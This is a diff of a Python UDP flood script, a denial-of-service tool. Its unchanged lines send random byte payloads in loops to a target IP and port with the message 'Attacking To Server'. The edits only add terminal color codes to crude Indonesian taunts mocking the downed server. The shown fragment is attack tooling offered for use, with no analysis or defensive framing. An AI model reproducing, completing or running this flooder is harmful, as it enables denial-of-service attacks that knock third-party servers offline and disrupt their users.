@@ -121,7 +121,7 @@ def xxxx():
         s.sendto(data,addr)
         print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
-      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
+      print("\033[1;32;40m[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xxx():
   data = random._urandom(998)
@@ -134,7 +134,7 @@ def xxx():
         s.sendto(data,addr)
         print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
-      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
+      print("\033[1;32;40m[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xx():
   data = random._urandom(871)
@@ -149,7 +149,7 @@ def xx():
         print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
-      print("[!] DOWN LU KONTOLLL!!!!")
+      print("\033[1;32;40m[!] DOWN LU KONTOLLL!!!!")
 
 def x():
   data = random._urandom(871)
@@ -164,7 +164,7 @@ def x():
         print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
-      print("[!] SERVER LEMAH NGENTOD!!!!!!")
+      print("\033[1;32;40m[!] SERVER LEMAH NGENTOD!!!!!!")
 
 for y in range(port):
   if choice == 'y':
